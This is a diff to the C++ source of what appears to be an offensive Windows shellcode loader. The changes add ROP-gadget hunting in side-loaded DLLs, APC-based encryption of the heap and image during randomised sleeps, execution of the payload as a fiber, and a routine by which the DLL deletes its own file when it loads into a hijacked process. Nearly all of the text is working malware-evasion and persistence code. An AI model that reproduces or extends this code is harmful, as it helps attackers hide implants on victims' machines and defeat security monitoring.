@@ -1,19 +1,22 @@
 #pragma once
 #include "Definitions.hpp"
 
+HANDLE myHeap = HeapCreate(0, 0, 0);
+HANDLE mainHeap = GetProcessHeap();
+
 int is_empty(char* buf, size_t size)
 {
 	return buf[0] == 0 && !memcmp(buf, buf + 1, size - 1);
 }
 
-void getBlock(dataBlock* block, LPVOID location) {
+/*void getBlock(dataBlock* block, LPVOID location) {
 	LPBYTE loc = (LPBYTE)location;
 	while (memcmp(loc, (void*)"\x00", 1) != 0) {
 		loc++;
 	}
 	block->location = location;
 	block->size = loc-location;
-}
+}*/
 
 // Heap encrypt function.  Walk all allocations in the heap and encrypt.
 BOOL HeapEncrypt() {
@@ -29,7 +32,7 @@ BOOL HeapEncrypt() {
 				SystemFunction032 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
 			}
 			if (!is_empty((char*)(entryEncryptDecrypt.lpData), entryEncryptDecrypt.cbData)) {
-				if (entryEncryptDecrypt.cbData > keySize) {
+				/*if (entryEncryptDecrypt.cbData > keySize) {
 					int fullSize = 0;
 					for (int x = 0; x < entryEncryptDecrypt.cbData; x++) {
 						dataBlock block = { 0 };
@@ -52,7 +55,12 @@ BOOL HeapEncrypt() {
 					cryptoData.MaximumLength = entryEncryptDecrypt.cbData;
 					cryptoData.Buffer = (char*)(entryEncryptDecrypt.lpData);
 					SystemFunction032(&cryptoData, &cryptoKey);
-				}
+				}*/
+				CRYPT_BUFFER cryptoData = { 0 };
+				cryptoData.Length = entryEncryptDecrypt.cbData;
+				cryptoData.MaximumLength = entryEncryptDecrypt.cbData;
+				cryptoData.Buffer = (char*)(entryEncryptDecrypt.lpData);
+				SystemFunction032(&cryptoData, &cryptoKey);
 			}
 		}
 	}
@@ -92,7 +100,7 @@ BOOL HeapDecrypt() {
 				SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction033");
 			}
 			if (!is_empty((char*)(entryEncryptDecrypt.lpData), entryEncryptDecrypt.cbData)) {
-				if (entryEncryptDecrypt.cbData > keySize) {
+				/*if (entryEncryptDecrypt.cbData > keySize) {
 					int fullSize = 0;
 					for (int x = 0; x < entryEncryptDecrypt.cbData; x++) {
 						dataBlock block = { 0 };
@@ -115,8 +123,13 @@ BOOL HeapDecrypt() {
 					cryptoData.MaximumLength = entryEncryptDecrypt.cbData;
 					cryptoData.Buffer = (char*)(entryEncryptDecrypt.lpData);
 					SystemFunction033(&cryptoData, &cryptoKey);
-						}
-					}
+				}*/
+				CRYPT_BUFFER cryptoData = { 0 };
+				cryptoData.Length = entryEncryptDecrypt.cbData;
+				cryptoData.MaximumLength = entryEncryptDecrypt.cbData;
+				cryptoData.Buffer = (char*)(entryEncryptDecrypt.lpData);
+				SystemFunction033(&cryptoData, &cryptoKey);
+			}
 		}
 	}
 #endif
@@ -146,6 +159,9 @@ BOOL HeapDecrypt() {
 LPVOID HookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
 	//LPVOID loc = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
 	LPVOID loc = VirtualAllocEx(GetCurrentProcess(), lpAddress, dwSize, flAllocationType, PAGE_READWRITE);
+	SIZE_T mySize = (SIZE_T)dwSize;
+	//ULONG oldProtectSH = 0;
+	//syscall.CallSyscall("NtProtectVirtualMemory", GetCurrentProcess(), &loc, &mySize, PAGE_EXECUTE_READWRITE, &oldProtectSH);
 	DWORD rewriteProtection = 0;
 	VirtualProtect(loc, dwSize, PAGE_EXECUTE_READWRITE, &rewriteProtection);
 	offload = loc;
@@ -179,6 +195,38 @@ void WINAPI HookedExitProcess(DWORD dwExitCode) {
 		gadget = gadgetfinder64(1, 0);
 	}
 
+	if (gadget == 0) {
+		pad = FALSE;
+		gadget = gadgetfinder64(3, 0);
+	}
+
+	// Windows 8 Solution.  This is an IOC.  We need a gadget from another DLL to unload.
+	if (gadget == 0 && IsWindows8OrGreater()) {
+		pad = 2;
+		if (loadDll == NULL) {
+			loadDll = LoadLibraryA("MSVidCtl.dll");
+		}
+		gadget = gadgetfinder64(4, 0);
+	}
+
+	if (gadget == 0) {
+		pad = 2;
+		if (loadDll == NULL) {
+			loadDll = LoadLibraryA("D3DCompiler_47.dll");
+		}
+		gadget = gadgetfinder64(4, 0);
+	}
+
+	if (gadget == 0) {
+		pad = 3;
+		if (loadDll == NULL) {
+			loadDll = LoadLibraryA("slr100.dll");
+		}
+		gadget = gadgetfinder64(2, 0, (LPVOID)"\x59\x5a\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", 11);
+	}
+
+	LPVOID popRCXRet = gadgetfinder64(2, 0, (LPVOID)"\x59\xC3", 2);
+
 	config.encLocation = (LPVOID)(offload);
 	config.BaseAddress = (LPVOID)selfBase;
 	config.ExitThread = (LPVOID)&TerminateThread;
@@ -186,9 +234,22 @@ void WINAPI HookedExitProcess(DWORD dwExitCode) {
 	config.VirtualFree = (LPVOID)&VirtualFree;
 	config.gadgetPad = (LPVOID)(dllOffloadEntryPoint);
 	config.gadget = gadget;
+	config.Encrypt = popRCXRet;
 	config.FreeType = MEM_RELEASE;
 
-	QueueUserAPC((PAPCFUNC)freeRop, GetCurrentThread(), (ULONG_PTR)&config);
+	if (pad == 1) {
+		QueueUserAPC((PAPCFUNC)freeRop, GetCurrentThread(), (ULONG_PTR)&config);
+	}
+	else if (pad == 2) {
+		QueueUserAPC((PAPCFUNC)freeRopV4, GetCurrentThread(), (ULONG_PTR)&config);
+	}
+	else if (pad == 0) {
+		QueueUserAPC((PAPCFUNC)freeRopV3, GetCurrentThread(), (ULONG_PTR)&config);
+	}
+	else if (pad == 3) {
+		QueueUserAPC((PAPCFUNC)freeRopV5, GetCurrentThread(), (ULONG_PTR)&config);
+	}
+
 	if (NtTestAlert == NULL) {
 		HMODULE ntdllLib = LoadLibrary("ntdll.dll");
 		if (ntdllLib) {
@@ -202,7 +263,25 @@ void WINAPI HookedExitProcess(DWORD dwExitCode) {
 // Hooked Get Process Heap
 // Return our custom heap handle for encryption/destruction
 HANDLE HookedGetProcessHeap() {
-	return myHeap;
+	if (IsWindows10OrGreater()) {
+		return myHeap;
+	}
+	else {
+		HMODULE hModule;
+		char lpBaseName[256];
+
+		if (::GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule) == 1) {
+			::GetModuleBaseNameA(GetCurrentProcess(), hModule, lpBaseName, sizeof(lpBaseName));
+		}
+
+		std::string modName = lpBaseName;
+		std::transform(modName.begin(), modName.end(), modName.begin(),
+			[](unsigned char c) { return std::tolower(c); });
+		if (modName.find("wininet") == std::string::npos && modName.find("urlmon") == std::string::npos) {
+			return myHeap;
+		}
+		return mainHeap;
+	}
 }
 
 // Hooked Sleep
@@ -210,7 +289,9 @@ HANDLE HookedGetProcessHeap() {
 // RX -> RW takes place here
 // Temporary removal of hooks takes place here
 void WINAPI HookedSleep(DWORD dwMiliseconds) {
-	//dwMiliseconds = 5000;
+	int randomInt = ((double)rand() / RAND_MAX) * (100 - 0) + 0;
+	dwMiliseconds = 2000 + (randomInt*1000);
+	//dwMiliseconds = 1000;
 	if (dwMiliseconds > 1000) {
 		if (SystemFunction032 == NULL) {
 			SystemFunction032 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
@@ -222,6 +303,35 @@ void WINAPI HookedSleep(DWORD dwMiliseconds) {
 
 		if (gadget == 0) {
 			gadget = gadgetfinder64(1, 0);
+		}
+
+		if (gadget == 0) {
+			pad = FALSE;
+			gadget = gadgetfinder64(3, 0);
+		}
+
+		if (gadget == 0 && IsWindows8OrGreater()) {
+			pad = 2;
+			if (loadDll == NULL) {
+				loadDll = LoadLibraryA("MSVidCtl.dll");
+			}
+			gadget = gadgetfinder64(4, 0);
+		}
+
+		if (gadget == 0) {
+			pad = 2;
+			if (loadDll == NULL) {
+				loadDll = LoadLibraryA("D3DCompiler_47.dll");
+			}
+			gadget = gadgetfinder64(4, 0);
+		}
+
+		if (gadget == 0) {
+			pad = 3;
+			if (loadDll == NULL) {
+				loadDll = LoadLibraryA("slr100.dll");
+			}
+			gadget = gadgetfinder64(2, 0, (LPVOID)"\x59\x5a\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", 11);
 		}
 
 		key = gen_random(keySize);
@@ -251,12 +361,29 @@ void WINAPI HookedSleep(DWORD dwMiliseconds) {
 		config.PayloadBuffer = &cryptoData;
 		config.key = &cryptoKey;
 		config.gadget = gadget;
-		config.gadgetPad = (LPBYTE)gadget + 0x02;
+		if (pad == 1 || pad == 3) {
+			config.gadgetPad = (LPBYTE)gadget + 0x02;
+		}
+		else {
+			config.gadgetPad = (LPBYTE)gadget;
+		}
 		config.BaseAddress = (LPVOID)selfBase;
 		config.DLLSize = (SIZE_T)selfBaseSize;
 		config.EncryptBuffer = &cryptoDataMain;
 
-		QueueUserAPC((PAPCFUNC)cryptor, GetCurrentThread(), (ULONG_PTR)&config);
+		if (pad == 1) {
+			QueueUserAPC((PAPCFUNC)cryptor, GetCurrentThread(), (ULONG_PTR)&config);
+		}
+		else if (pad == 0) {
+			QueueUserAPC((PAPCFUNC)cryptorV3, GetCurrentThread(), (ULONG_PTR)&config);
+		}
+		else if (pad == 2) {
+			QueueUserAPC((PAPCFUNC)cryptorV4, GetCurrentThread(), (ULONG_PTR)&config);
+		}
+		else if (pad == 3) {
+			QueueUserAPC((PAPCFUNC)cryptorV5, GetCurrentThread(), (ULONG_PTR)&config);
+		}
+
 #if defined(RELEASE_EXE) || defined (DEBUG_EXE)
 		HeapLock(GetProcessHeap());
 		DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
@@ -294,7 +421,7 @@ void WINAPI HookedSleep(DWORD dwMiliseconds) {
 }
 
 void doCleanup(LPVOID cleanup) {
-	SleepEx(500, FALSE);
+	//SleepEx(500, FALSE);
 	VirtualFree(cleanup, 0, MEM_RELEASE);
 }
 
@@ -302,7 +429,7 @@ void doCleanup(LPVOID cleanup) {
 #if defined(RELEASE_DLL)
 __declspec(dllexport) void main(LPVOID dllOffloadEntry = NULL)
 #else
-void main()
+void main(LPVOID dllOffloadEntry = NULL)
 #endif
 {
 	TCHAR szFileName[MAX_PATH];
@@ -314,8 +441,11 @@ void main()
 
 	// Get a list of all the modules in this process.
 	MEMORY_BASIC_INFORMATION selfData = { 0 };
+	//PSIZE_T t = 0;
+	//_VirtualQuery(GetCurrentProcess(), (PVOID)&main, MemoryBasicInformation, &selfData, sizeof(selfData), t);
 	VirtualQuery(&main, &selfData, sizeof(selfData));
 	MEMORY_BASIC_INFORMATION selfData2 = { 0 };
+	//_VirtualQuery(GetCurrentProcess(), (PVOID)selfData.AllocationBase, MemoryBasicInformation, &selfData2, sizeof(selfData2), t);
 	VirtualQuery(selfData.AllocationBase, &selfData2, sizeof(selfData2));
 
 	selfBase = selfData2.AllocationBase;
@@ -344,25 +474,29 @@ void main()
 
 	//SymInitialize(GetCurrentProcess(), NULL, TRUE);
 	// Refresh the most important DLLs in case they are hooked and detect any VEH hooks
-	universalRefresher("ntdll.dll");
-	universalRefresher("kernel32.dll");
-	universalRefresher("kernelbase.dll");
-	universalRefresher("msvcrt.dll");
+	//universalRefresher("ntdll.dll");
+	//universalRefresher("kernel32.dll");
+	//universalRefresher("kernelbase.dll");
+	//universalRefresher("msvcrt.dll");
 
-	static HANDLE hproc = GetCurrentProcess();
-	static size_t bytesWritten = 0;
-	static DWORD oldProtect = 0;
-	void* sh = VirtualAllocEx(hproc, 0, (SIZE_T)Pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	WriteProcessMemory(hproc, sh, Pay_dll, Pay_len, &bytesWritten);
-	VirtualProtectEx(hproc, sh, Pay_len, PAGE_EXECUTE_READ, &oldProtect);
+	SIZE_T mySize = (SIZE_T)Pay_len;
+	//PVOID sh = NULL;
+	//syscall.CallSyscall("NtAllocateVirtualMemory", GetCurrentProcess(), &sh, NULL, &mySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	void* sh = VirtualAllocEx(GetCurrentProcess(), 0, (SIZE_T)Pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	//size_t bytesWritten = 0;
+	//WriteProcessMemory(GetCurrentProcess(), sh, Pay_dll, Pay_len, &bytesWritten);
+	memcpy(sh, Pay_dll, Pay_len);
+	//ULONG oldProtectSH = 0;
+	//syscall.CallSyscall("NtProtectVirtualMemory", GetCurrentProcess(), &sh, &mySize, PAGE_EXECUTE_READ, &oldProtectSH);
+	DWORD oldProtect = 0;
+	VirtualProtectEx(GetCurrentProcess(), sh, Pay_len, PAGE_EXECUTE_READ, &oldProtect);
 #if defined(RELEASE_EXE) || defined(DEBUG_EXE) || defined(DEBUG_DLL)
 	//HANDLE threadToResume = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sh, NULL, CREATE_SUSPENDED, &hookID);
 	//ResumeThread(threadToResume);
 	LPVOID fakeAddr = (LPVOID)(((ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "RtlUserThreadStart")) + 0x21);
-
 	RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
 	HANDLE threadHandle;
-	RtlCreateUserThread(hproc, NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)fakeAddr, NULL, &threadHandle, NULL);
+	RtlCreateUserThread(GetCurrentProcess(), NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)fakeAddr, NULL, &threadHandle, NULL);
 	hookID = GetThreadId(threadHandle);
 	// Get the current registers set for our thread
 	CONTEXT ctx;
@@ -374,12 +508,18 @@ void main()
 	SleepEx(1000, FALSE);
 	Initialize3Context(TRUE);
 	ResumeThread(threadHandle);
+	
+	/*hookID = GetCurrentThreadId();
+	Initialize3Context(FALSE);
+	PVOID mainFiber = ConvertThreadToFiber(NULL);
+	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)sh, NULL);
+	SwitchToFiber(shellcodeFiber);*/
 	while (TRUE) {};
 #endif
 #ifdef RELEASE_DLL
-	RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
+	/*RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
 	HANDLE threadHandle;
-	RtlCreateUserThread(hproc, NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, NULL, &threadHandle, NULL);
+	RtlCreateUserThread(GetCurrentProcess(), NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)((LPBYTE)RtlCreateUserThread+0x21), NULL, &threadHandle, NULL);
 	hookID = GetThreadId(threadHandle);
 	// Get the current registers set for our thread
 	CONTEXT ctx;
@@ -391,19 +531,104 @@ void main()
 	SleepEx(1500, FALSE);
 	Initialize3Context(FALSE);
 	ResumeThread(threadHandle);
+	*/
 
+	hookID = GetCurrentThreadId();
+	Initialize3Context(FALSE);
+	PVOID mainFiber = ConvertThreadToFiber(NULL);
+	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)sh, NULL);
+	SwitchToFiber(shellcodeFiber);
+	
 	if (fileName.find(procNameHijack) != std::string::npos) {
 		Initialize2Context(FALSE);
 	} else if (fileName.find("rundll32") != std::string::npos) {
-		while (TRUE);
+		//while (TRUE);
 	}
 
 	if (dllOffloadEntry != NULL) {
 		MEMORY_BASIC_INFORMATION cleanOffloader = { 0 };
+		//PSIZE_T w = 0;
+		//_VirtualQuery(GetCurrentProcess(), (PVOID)dllOffloadEntry, MemoryBasicInformation, &cleanOffloader, sizeof(cleanOffloader), w);
 		VirtualQuery(dllOffloadEntry, &cleanOffloader, sizeof(cleanOffloader));
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)doCleanup, (LPVOID)cleanOffloader.AllocationBase, 0, NULL);
 	}
 #endif
+}
+
+static HANDLE ds_open_handle(PWCHAR pwPath)
+{
+	return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+}
+
+static BOOL ds_rename_handle(HANDLE hHandle)
+{
+	FILE_RENAME_INFO fRename;
+	RtlSecureZeroMemory(&fRename, sizeof(fRename));
+
+	// set our FileNameLength and FileName to DS_STREAM_RENAME
+	LPWSTR lpwStream = (LPWSTR)DS_STREAM_RENAME;
+	fRename.FileNameLength = sizeof(lpwStream);
+	RtlCopyMemory(fRename.FileName, lpwStream, sizeof(lpwStream));
+
+	return SetFileInformationByHandle(hHandle, FileRenameInfo, &fRename, sizeof(fRename) + sizeof(lpwStream));
+}
+
+static BOOL ds_deposite_handle(HANDLE hHandle)
+{
+	// set FILE_DISPOSITION_INFO::DeleteFile to TRUE
+	FILE_DISPOSITION_INFO fDelete;
+	RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
+
+	fDelete.DeleteFile = TRUE;
+
+	return SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
+}
+
+static int selfDelete(LPCSTR lpModuleName = NULL) {
+	WCHAR wcPath[MAX_PATH + 1];
+	RtlSecureZeroMemory(wcPath, sizeof(wcPath));
+
+	// get the path to the current running process ctx
+	if (GetModuleFileNameW(GetModuleHandleA(lpModuleName), wcPath, MAX_PATH) == 0)
+	{
+		return 0;
+	}
+
+	HANDLE hCurrent = ds_open_handle(wcPath);
+	if (hCurrent == INVALID_HANDLE_VALUE)
+	{
+		return 0;
+	}
+
+	// rename the associated HANDLE's file name
+	if (!ds_rename_handle(hCurrent))
+	{
+		return 0;
+	}
+
+	CloseHandle(hCurrent);
+
+	// open another handle, trigger deletion on close
+	hCurrent = ds_open_handle(wcPath);
+	if (hCurrent == INVALID_HANDLE_VALUE)
+	{
+		return 0;
+	}
+
+	if (!ds_deposite_handle(hCurrent))
+	{
+		return 0;
+	}
+
+	// trigger the deletion deposition on hCurrent
+	CloseHandle(hCurrent);
+
+	// verify we've been deleted
+	if (PathFileExistsW(wcPath))
+	{
+		return 0;
+	}
+
 }
 
 // DLL Entry Point
@@ -423,6 +648,8 @@ BOOL WINAPI DllMain(
 		// Initialize once for each new process.
 		// Return FALSE to fail DLL load.
 		if (fileName.find(procNameHijack) != std::string::npos) {
+			selfDelete(dllNameHijack.c_str());
+			//selfDelete();
 			main();
 		}
 		break;
